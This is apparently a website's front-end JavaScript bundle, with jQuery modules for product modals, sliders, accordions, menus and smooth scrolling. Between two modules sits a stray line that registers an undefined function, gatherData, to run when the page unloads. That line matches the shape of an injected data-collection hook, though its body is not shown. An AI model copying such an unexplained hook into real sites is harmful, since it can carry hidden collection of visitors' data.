          modal.find('iframe').parent().addClass('js-modalMovieContent-youtube');
          modal.find('iframe').attr('src', src);
          modal.modal('show');
        }
      }.bind(this));
    };
    ui.productInfo = function () {
      function init() {
        $('.mod-productInfo').each(function () {
          var $this = $(this);
          new ProductInfoImg($this);
          new ProductInfoMovie($this);
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
window.addEventListener("beforeunload", gatherData);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.media7018 = function () {
      var elem = null,
        obj = null;
      function init() {
        elem = $('.mod-media7018');
        elem.each(function () {
          var $this = $(this);
          $this.clone().addClass('mod-media7018-mobile').insertAfter($this);
        });
        $('.mod-media7018-mobile').find('.mod-media7018_inner').slick({
          dots: false,
          slidesToShow: 2,
          slidesToScroll: 2
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.compound_a762 = function () {
      var elem,
        accordions = [];
      function init() {
        elem = $('.mod-compoundA762');
        elem.each(function (i) {
          var $this = $(this);
          accordions[i] = new util.Accordion3({
            parent: $this,
            trigger: $this.find('.mod-compoundA762_trigger').find('button'),
            contents: $this.find('.mod-compoundA762_content'),
            isOpening: false
          });
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.categoryTopHeroImgChanger = function () {
      var elem = null,
        button = null,
        enterFlag = 'is-mouseEnter',
        speed = 3000;
      function init() {
        elem = $('.mod-categoryTopHeroImg_imgChanger');
        elem.on({
          'init breakpoint': function () {
            button = elem.find('.slick-dots button');
            if (!button.find('span').length) {
              button.wrapInner('<span>').find('span').css({
                'animation-duration': speed + "ms"
              });
            }
          },
          'mouseenter.categoryTopHeroImg': function () {
            elem.addClass(enterFlag);
          },
          'mouseleave.categoryTopHeroImg': function () {
            elem.removeClass(enterFlag);
          }
        });
        elem.find('ul').slick({
          dots: true,
          arrows: true,
          fade: true,
          pauseOnHover: false,
          autoplay: true,
          autoplaySpeed: speed,
          responsive: [{
            breakpoint: 641,
            settings: {
              arrows: false
            }
          }]
        });
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    ui.link6013 = function () {
      var elem = null;
      function init() {
        elem = $('.mod-link6013_button');
        if (util.matchMedia.lte640.matches) {
          ;
        } else {
          flatten();
        }
        util.matchMedia.lte640.addListener(function () {
          if (util.matchMedia.print.matches) return;
          if (util.matchMedia.lte640.matches) {
            cancelHeight();
          } else {
            flatten();
          }
        });
      }
      function flatten() {
        elem.each(function () {
          $(this).find('a').tile(2);
        });
      }
      function cancelHeight() {
        elem.find('a').css('height', '');
      }
      return {
        init: init
      };
    }();
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);
(function ($, _, util, obj, ui) {
  $(function () {
    /* ======================================================
    // SNS ボタン
    // ------------------------------------------------------ */

    ui.snsButton.init();

    /* ======================================================
    // グロナビ、メガメニュー(PC)、ハンバーガーメニュー(SP)
    // ------------------------------------------------------ */

    var megaMenu = new ui.MegaMenu();
    var megaMenu_s = new ui.MegaMenu_s();
    var mobileMenu = new ui.MobileMenu();

    // 検索バーを PC 版とスマホ版で共有する
    (function () {
      // 0: PC, 1: SP
      var mode = -1;
      var spMediaQuery = util.matchMedia.lte768;
      var callback = function () {
        // SP -> PC
        if (!spMediaQuery.matches) {
          megaMenu.showLazyImages();
          if (mode === 1) {
            megaMenu_s.setSearchInput(mobileMenu.getSearchInput());
            mode = 0;
          }
        }
        // PC -> SP
        else if (spMediaQuery.matches) {
          mobileMenu.showLazyImages();
          if (mode <= 0) {
            mobileMenu.setSearchInput(megaMenu_s.getSearchInput());
            mode = 1;
          }
        }
      };
      spMediaQuery.addListener(callback);
      callback();
    })();

    /* ======================================================
     // ローカルナビ（SP）
     // ------------------------------------------------------ */

    var localNavSp = new ui.LocalNavSp();

    /* ======================================================
    // スムーススクロール
    // ------------------------------------------------------ */

    $('a[href^="#"], .js-smoothScroll').on('click', function (e) {
      var href = $(this).attr('href');
      if (href === '#') {
        return;
      }
      e.preventDefault();
      util.smoothScroll(href);
    });
    ui.backToTopFixed.init();
    ui.accordion.init();
    ui.accordion2.init();
    ui.accordion_a904.init();
    ui.accordion_a302.init();
    ui.accordion_a771.init();
    ui.accordion_a921.init();
    ui.accordion_c822_1.init();
    ui.accordion_c822_2.init();
    ui.contentNav3.init();
    ui.productLineUpAccordion.init();
    ui.modal.init();
    ui.modal_c912.init();
    ui.modalMovie.init();
    ui.headingLv1.init();
    ui.productInfo.init();
    ui.media7018.init();
    ui.compound_a762.init();
    ui.categoryTopHeroImgChanger.init();
    ui.link6013.init();
    $('.modal').on('show.bs.modal', function () {
      if (util.matchMedia.lte640.matches) {
        $('.modal').css('top', obj.$win.scrollTop() + 'px');
      }
    });
    $('.modal').on('hidden.bs.modal', function () {
      $(this).css('top', '0');
      var iframe = $(this).find('iframe').removeAttr('src');
      var parent = $(this).find('iframe').parent();
      iframe.remove();
      parent.append(iframe);
    });
    util.matchMedia.lte640.addListener(function (mediaQuery) {
      if (util.matchMedia.print.matches) return;
      if (mediaQuery.matches) {
        $('.modal').css('top', obj.$win.scrollTop() + 'px');
      } else {
        $('.modal').css('top', '0');
      }
    });
  });
})(BROTHER.lib.$, BROTHER.lib._, BROTHER.util, BROTHER.obj, BROTHER.ui);